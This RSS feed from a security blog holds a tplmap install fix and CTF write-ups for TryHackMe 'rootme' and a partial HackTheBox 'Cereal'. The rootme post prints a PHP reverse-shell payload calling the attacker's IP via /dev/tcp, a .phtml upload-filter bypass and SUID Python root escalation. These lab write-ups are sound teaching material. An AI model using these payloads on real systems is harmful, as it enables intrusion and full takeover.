<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Python on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/python/</link>
    <description>Recent content in Python on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 05 Nov 2021 20:40:16 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/python/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Tplmap Install</title>
      <link>https://fahmifj.github.io/blog/tplmap-install/</link>
      <pubDate>Fri, 05 Nov 2021 20:40:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/tplmap-install/</guid>
      <description>Python pip so weirrd</description>
      <content:encoded><![CDATA[<p>This is a quick note to get <code>tplmap</code> working again!</p>
<p>Previously on <a href="https://fahmifj.github.io/hackthebox/doctor/">HTB: Doctor</a>, this tool was worked fine with python2, but when I tried to use it again on <a href="https://fahmifj.github.io/hackthebox/nunchucks/">HTB: Nunchucks</a>, it threw these error messages.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «192.168.1.55» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ python tplmap.py 
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/opt/tplmap-venv/tplmap/./tplmap.py&#34;</span>, line 2, in &lt;module&gt;
</span></span><span class="line"><span class="cl">    from utils import cliparser
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/opt/tplmap-venv/tplmap/utils/cliparser.py&#34;</span>, line 163, in &lt;module&gt;
</span></span><span class="line"><span class="cl">    parser.formatter.format_option_strings <span class="o">=</span> type<span class="o">(</span>parser.formatter.format_option_strings<span class="o">)(</span>_, parser, type<span class="o">(</span>parser<span class="o">))</span>
</span></span><span class="line"><span class="cl">TypeError: method expected <span class="m">2</span> arguments, got <span class="m">3</span>
</span></span></code></pre></div><p>Here&rsquo;s how I resolve it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python2 -m pip install --upgrade setuptools
</span></span><span class="line"><span class="cl">$ python2 -m pip install virtualenv 
</span></span><span class="line"><span class="cl">$ git clone https://github.com/epinna/tplmap.git
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> ./tplmap/
</span></span><span class="line"><span class="cl">$ python2 -m virtualenv tplmap-venv
</span></span><span class="line"><span class="cl">$ <span class="nb">source</span> ./tplmap-venv/bin/activate
</span></span><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> $ python2 -m pip install -r requirements.txt 
</span></span></code></pre></div><p>All the requirements should be listed now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → $ python2 -m pip list                                                      
</span></span><span class="line"><span class="cl">--<span class="o">[</span>snip annoying deprecated message<span class="o">]</span>--
</span></span><span class="line"><span class="cl">Package    Version
</span></span><span class="line"><span class="cl">---------- ----------
</span></span><span class="line"><span class="cl">certifi    2018.10.15
</span></span><span class="line"><span class="cl">chardet    3.0.4
</span></span><span class="line"><span class="cl">idna       2.8
</span></span><span class="line"><span class="cl">pip        20.3.4
</span></span><span class="line"><span class="cl">PyYAML     5.1.2
</span></span><span class="line"><span class="cl">requests   2.22.0
</span></span><span class="line"><span class="cl">setuptools 44.1.1
</span></span><span class="line"><span class="cl">urllib3    1.24.1
</span></span><span class="line"><span class="cl">wheel      0.37.0
</span></span></code></pre></div><p>It&rsquo;s working fine now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «192.168.1.55» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ python2 tplmap.py 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Usage: python tplmap.py <span class="o">[</span>options<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tplmap.py: error: URL is required. Run with -h <span class="k">for</span> help.
</span></span></code></pre></div><p>I&rsquo;m not sure about this, but on my other Kali, these commands (without venv) could get <code>tplmap</code> working again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python2 install --upgrade setuptools
</span></span><span class="line"><span class="cl">$ python2 -m pip install -r requirements.txt 
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - rootme</title>
      <link>https://fahmifj.github.io/tryhackme/rootme/</link>
      <pubDate>Fri, 02 Jul 2021 22:08:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/rootme/</guid>
      <description>A ctf for beginners, can you root me?</description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong>  <a href="https://tryhackme.com/room/rrootme">rootme</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools:</strong>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
</ul>
</li>
<li><strong>Skills Learned</strong>:
<ul>
<li>Web enumeration</li>
<li>SUID exploitation</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: SSH on port 22 and HTTP on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.215.165                      
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 23:35 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.215.165
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.26s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 96.24 seconds
</span></span></code></pre></div><p>Running a script scan didn&rsquo;t really helpful, so I&rsquo;ll dig the website on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website doesn&rsquo;t display anything except a prompt-like text &ldquo;root@rootme:~#&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210530105241967.png" alt="image-20210530105241967"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>Gobuster</code> scan discovers several directories on this website, ones of which interesting are <code>/uploads</code> and <code>/panel</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.215.165/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.215.165/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:37:44 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/css/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/uploads/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/panel                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.215.165/panel/<span class="o">]</span>  
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>                 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 23:43:21 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="panel">/panel</h4>
<p>On <code>/panel</code>, there is an upload form, but it blocks a file with <code>.php</code> extensions.</p>
<p><div class="img-container"><img src="imgs/image-20210530105345640.png" alt="image-20210530105345640"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="upload-filter-bypass">Upload filter bypass</h4>
<p>Uploading a file with extension <code>.phtml</code> bypasses the upload filter. The uploaded file can be found at <code>/uploads/[here]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530105538891.png" alt="image-20210530105538891"  /></div>
</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I&rsquo;ll upload the following file and setup a listener to get a shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115»  
</span></span><span class="line"><span class="cl">$ cat iamf.phtml    
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.30.115/443 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>I&rsquo;ll trigger reverse shell by visiting <code> http://10.10.215.165/uploads/iamf.phtml</code> on the browser.</p>
<p><div class="img-container"><img src="imgs/image-20210530105644738.png" alt="image-20210530105644738"  /></div>
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll do the PTY trick to upgrade my shell to interactive one.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@rootme:/var/www/html$ which python
</span></span><span class="line"><span class="cl">which python
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@rootme:/var/www/html$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> suspended  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">→ root@kali «rootme» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">2625</span> continued  nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash-4.4$ 
</span></span></code></pre></div><p>The user flag can be found at <code>/var/www/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -user www-data 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc\|sys&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/var/www/user.txt
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<p>I find out the current Python binary has SUID bit set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;snap&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/usr/bin/python
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p>Python with SUID can be exploited by executing <code>import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">bash-4.4# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210530111120071.png" alt="image-20210530111120071"  /></div>
</p>
<p>I can grab the root flag now.</p>
<p><div class="img-container"><img src="imgs/image-20210530111235501.png" alt="image-20210530111235501"  /></div>
</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cereal (User)</title>
      <link>https://fahmifj.github.io/hackthebox/cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cereal/</guid>
      <description>Chaining XSS, SSRF, and deserialization vulnerabilities to get RCE</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server, which exposes source code of the currently hosted web application. Initial source code analysis revealed a deleted JWT secret that could be used to forge a JWT token and bypass the application&rsquo;s login page. Another code analysis finds the web is vulnerable to a deserialization attack. There is also an XSS vulnerability in one of the packages used by the application. Chaining these vulnerabilities results in a shell access to the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
<li>Exploit chain</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:45 EDT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp  open  ssh     syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http    syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">443/tcp open  https   syn-ack ttl <span class="m">127</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 118.08 seconds
</span></span></code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-04 23:51 EDT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://cereal.htb/
</span></span><span class="line"><span class="cl"><span class="p">|</span>_https-redirect: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Cereal
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cereal.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-11-11T19:57:18
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2040-11-11T20:07:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-06-05T03:51:48+00:00<span class="p">;</span> +5s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 4s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 23.34 seconds
</span></span></code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form. I tried a few common credentials, but they didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>, but l&rsquo;ll leave it for now.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do with this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     https://source.cereal.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              aspx,txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/05 00:52:32 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/.git/HEAD            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 23<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 10090<span class="o">]</span>
</span></span><span class="line"><span class="cl">/aspnet_client        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/default.aspx         <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 9727<span class="o">]</span>                                              
</span></span><span class="line"><span class="cl">/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 157<span class="o">]</span> <span class="o">[</span>--&gt; https://source.cereal.htb/uploads/<span class="o">]</span>      
</span></span><span class="line"><span class="cl">                                                                                              
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/06/05 00:54:41 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Access to the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -I -k http://source.cereal.htb/.git/ <span class="o">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1233</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:25 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">1233</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:08:16 GMT
</span></span></code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -I -k http://source.cereal.htb/.git/HEAD
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">23</span>
</span></span><span class="line"><span class="cl">Content-Type: text/plain
</span></span><span class="line"><span class="cl">Last-Modified: Wed, <span class="m">11</span> Nov <span class="m">2020</span> 20:09:34 GMT
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;adc1d19266b8d61:0&#34;</span>
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: Sugar
</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Jun <span class="m">2021</span> 05:01:29 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «cereal» «10.10.14.3» 
</span></span><span class="line"><span class="cl">$ curl -s -k http://source.cereal.htb/.git/HEAD
</span></span><span class="line"><span class="cl">ref: refs/heads/master
</span></span></code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory.</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
